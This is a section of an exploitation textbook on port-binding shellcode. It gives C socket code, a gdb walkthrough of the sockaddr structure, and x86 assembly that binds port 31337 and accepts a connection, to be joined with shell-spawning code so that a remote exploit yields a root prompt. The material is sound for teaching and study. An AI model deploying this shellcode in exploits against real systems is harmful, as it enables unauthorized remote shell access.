<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x540 Port-Binding Shellcode</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part123.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part125.htm">Next &gt;</a></p><p class="s30" style="padding-left: 37pt;text-indent: 0pt;text-align: left;"><a name="bookmark113">0x540 Port-Binding Shellcode</a></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">When exploiting a remote program, the shellcode we’ve designed so far won’t work. The injected shellcode needs to communicate over the network to deliver an interactive root prompt. Port-binding shellcode will bind the shell to a network port where it listens for incoming connections. In the previous chapter, we used this kind of shellcode to exploit the tinyweb server. The following C code binds to port 31337 and listens for a TCP connection.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">bind_port.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_929.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int main(void) {</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 106%;text-align: left;">int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd struct sockaddr_in host_addr, client_addr;  // My address information socklen_t sin_size;</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">int yes=1;</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 21pt;text-align: left;">sockfd = socket(PF_INET, SOCK_STREAM, 0); host_addr.sin_family = AF_INET;    // Host byte order</p><p class="s31" style="padding-top: 1pt;padding-left: 104pt;text-indent: 0pt;line-height: 106%;text-align: left;">host_addr.sin_port = htons(31337);   // Short, network byte order host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP. memset(&amp;(host_addr.sin_zero), &#39;\0&#39;, 8); // Zero the rest of the struct.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 212%;text-align: left;">bind(sockfd, (struct sockaddr *)&amp;host_addr, sizeof(struct sockaddr)); listen(sockfd, 4);</p><p class="s31" style="padding-top: 2pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">sin_size = sizeof(struct sockaddr_in);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">new_sockfd = accept(sockfd, (struct sockaddr *)&amp;client_addr, &amp;sin_size);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_930.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">These familiar socket functions can all be accessed with a single Linux system call, aptly named <span class="s31">socketcall()</span>. This is syscall number 102, which has a slightly cryptic manual page.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_931.png"/></span></p><p class="s31" style="padding-top: 13pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ grep socketcall /usr/include/asm-i386/unistd.h #define <u>&nbsp; </u>NR_socketcall     102</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ man 2 socketcall</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">IPC(2)           Linux Programmer&#39;s Manual           IPC(2)</p><p class="s31" style="padding-top: 11pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">NAME</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">socketcall - socket system calls</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SYNOPSIS</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: justify;">int socketcall(int call, unsigned long *args);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">DESCRIPTION</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;line-height: 107%;text-align: justify;">socketcall() is a common kernel entry point for the socket system calls. call determines which socket function to invoke. args points to a block containing the actual arguments, which are passed through to the appropriate call.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 49pt;text-indent: 0pt;line-height: 107%;text-align: justify;">User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel hackers need to know about socketcall().</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_932.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 110%;text-align: left;">The possible call numbers for the first argument are listed in the linux/net.h include file.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">From /usr/include/linux/net.h</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_933.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#define SYS_SOCKET  1  /* sys_socket(2)   */ #define SYS_BIND  2  /* sys_bind(2)    */ #define SYS_CONNECT 3  /* sys_connect(2)  */ #define SYS_LISTEN  4  /* sys_listen(2)   */ #define SYS_ACCEPT  5  /* sys_accept(2)   */</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">#define SYS_GETSOCKNAME 6  /* sys_getsockname(2)  */ #define SYS_GETPEERNAME 7  /* sys_getpeername(2)  */ #define SYS_SOCKETPAIR 8  /* sys_socketpair(2)  */ #define SYS_SEND 9  /* sys_send(2)   */</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#define SYS_RECV 10   /* sys_recv(2)   */ #define SYS_SENDTO 11  /* sys_sendto(2)   */ #define SYS_RECVFROM  12   /* sys_recvfrom(2)  */ #define SYS_SHUTDOWN  13   /* sys_shutdown(2)  */</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">#define SYS_SETSOCKOPT 14  /* sys_setsockopt(2)  */ #define SYS_GETSOCKOPT 15  /* sys_getsockopt(2)  */ #define SYS_SENDMSG 16  /* sys_sendmsg(2)  */</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;">#define SYS_RECVMSG 17  /* sys_recvmsg(2)  */</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_934.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">So, to make socket system calls using Linux, EAX is always 102 for <span class="s31">socketcall()</span>, EBX contains the type of socket call, and ECX is a pointer to the socket call’s arguments. The calls are simple enough, but some of them require a <span class="s31">sockaddr </span>structure, which must be built by the shellcode. Debugging the compiled C code is the most direct way to look at this structure in memory.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_935.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g bind_port.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) list 18</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">13    sockfd = socket(PF_INET, SOCK_STREAM, 0);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">14</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">15     host_addr.sin_family = AF_INET;     // Host byte order</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">16     host_addr.sin_port = htons(31337);    // Short, network byte order</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">17     host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">18    memset(&amp;(host_addr.sin_zero), &#39;\0&#39;, 8); // Zero the rest of the struct. 19</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">20     bind(sockfd, (struct sockaddr *)&amp;host_addr, sizeof(struct sockaddr));</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">21</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">22    listen(sockfd, 4);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break 13</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1 at 0x804849b: file bind_port.c, line 13. (gdb) break 20</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2 at 0x80484f5: file bind_port.c, line 20. (gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, main () at bind_port.c:13</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">13    sockfd = socket(PF_INET, SOCK_STREAM, 0);</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:93pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">(gdb) x/5i $eip</p></td><td style="width:312pt" colspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:93pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x804849b &lt;main+23&gt;:</p></td><td style="width:32pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp+8],0x0</p></td></tr><tr style="height:11pt"><td style="width:93pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0x80484a3 &lt;main+31&gt;:</p></td><td style="width:32pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp+4],0x1</p></td></tr><tr style="height:11pt"><td style="width:93pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0x80484ab &lt;main+39&gt;:</p></td><td style="width:32pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp],0x2</p></td></tr><tr style="height:11pt"><td style="width:93pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x80484b2 &lt;main+46&gt;:</p></td><td style="width:32pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048394 &lt;socket@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:93pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x80484b7 &lt;main+51&gt;:</p></td><td style="width:32pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [ebp-12],eax</p></td></tr><tr style="height:14pt"><td style="width:93pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:32pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:280pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The first breakpoint is just before the socket call happens, since we need to check the values of <span class="s31">PF_INET </span>and <span class="s31">SOCK_STREAM</span>. All three arguments are pushed to the stack (but with <span class="s31">mov </span>instructions) in reverse order. This means <span class="s31">PF_INET </span>is <span class="s31">2 </span>and <span class="s31">SOCK_STREAM </span>is <span class="s31">1</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_936.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) cont Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 2, main () at bind_port.c:20</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">20    bind(sockfd, (struct sockaddr *)&amp;host_addr, sizeof(struct sockaddr)); (gdb) print host_addr</p><p class="s31" style="padding-left: 27pt;text-indent: -8pt;line-height: 107%;text-align: left;">$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0}, sin_zero = &quot;\000\000\000\000\000\000\000&quot;}</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) print sizeof(struct sockaddr)</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: justify;">$2 = 16</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: justify;">(gdb) x/16xb &amp;host_addr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: justify;">0xbffff780:   <b>0x02  0x00  0x7a  0x69  0x00  0x00  0x00  0x00 </b>0xbffff788:   0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00 (gdb) p /x 27002</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$3 = 0x697a (gdb) p 0x7a69</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$4 = 31337</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_937.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">The next breakpoint happens after the <span class="s31">sockaddr </span>structure is filled with values. The debugger is smart enough to decode the elements of the structure when <span class="s31">host_addr </span>is printed, but now <span class="s27">you </span>need to be smart enough to realize the port is stored in network byte order. The <span class="s31">sin_family </span>and <span class="s31">sin_port </span>elements are both words, followed by the address as a <span class="s31">DWORD</span>. In this case, the address is <span class="s31">0</span>, which means any address can be used for binding. The remaining eight bytes after that are just extra space in the structure. The first eight bytes in the structure (shown in bold) contain all the important information.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The following assembly instructions perform all the socket calls needed to bind to port 31337 and accept TCP connections. The <span class="s31">sockaddr </span>structure and the argument arrays are each created by pushing values in reverse order to the stack and then copying ESP into ECX. The last eight bytes of the <span class="s31">sockaddr </span>structure aren’t actually pushed to the stack, since they aren’t used. Whatever random eight bytes happen to be on the stack will occupy this space, which is fine.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">bind_port.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_938.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; s = socket(2, 1, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x66  ; socketcall is syscall #102 (0x66). pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">cdq       ; Zero out edx for use as a null DWORD later. xor ebx, ebx   ; ebx is the type of socketcall.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; 1 = SYS_SOCKET = socket()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push edx      ; Build arg array: { protocol = 0, push BYTE 0x1   ;  (in reverse)   SOCK_STREAM = 1, push BYTE 0x2   ;           AF_INET = 2 }</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ecx, esp   ; ecx = ptr to argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 212%;text-align: left;">int 0x80     ; After syscall, eax has socket file descriptor. mov esi, eax   ; save socket FD in esi for later</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; bind(s, [2, 31337, 0], 16)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push BYTE 0x66  ; socketcall (syscall #102) pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; ebx = 2 = SYS_BIND = bind()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push edx     ; Build sockaddr struct: INADDR_ANY = 0 push WORD 0x697a ;  (in reverse order)  PORT = 31337 push WORD bx   ;            AF_INET = 2 mov ecx, esp   ; ecx = server struct pointer</p><p class="s31" style="padding-top: 2pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">push BYTE 16   ; argv: { sizeof(server struct) = 16, push ecx     ;     server struct pointer, push esi     ;     socket file descriptor } mov ecx, esp   ; ecx = argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; eax = 0 on success</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; listen(s, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0x66 ; socketcall (syscall #102) inc ebx</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; ebx = 4 = SYS_LISTEN = listen()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push ebx     ; argv: { backlog = 4,</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push esi      ;     socket fd } mov ecx, esp    ; ecx = argument array int 0x80</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; c = accept(s, 0, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0x66 ; socketcall (syscall #102)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx     ; ebx = 5 = SYS_ACCEPT = accept()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push edx     ; argv: { socklen = 0,</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push edx     ;     sockaddr ptr = NULL,</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push esi      ;     socket fd } mov ecx, esp    ; ecx = argument array</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int 0x80     ; eax = connected socket FD</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_939.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When assembled and used in an exploit, this shellcode will bind to port 31337 and wait for an incoming connection, blocking at the accept call. When a connection is accepted, the new socket file descriptor is put into EAX at the end of this code. This won’t really be useful until it’s combined with the shell-spawning code described earlier. Fortunately, standard file descrip- tors make this fusion remarkably simple.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part123.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part125.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
